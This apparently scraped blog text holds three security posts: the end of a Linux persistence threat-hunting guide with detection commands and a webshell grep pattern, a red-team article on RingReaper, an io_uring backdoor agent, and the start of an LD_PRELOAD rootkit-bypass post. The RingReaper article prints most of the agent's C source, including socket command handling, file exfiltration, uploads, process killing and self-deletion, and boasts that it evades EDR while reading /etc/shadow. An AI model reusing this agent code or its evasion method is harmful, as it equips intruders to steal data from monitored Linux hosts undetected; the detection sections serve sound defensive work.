as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the 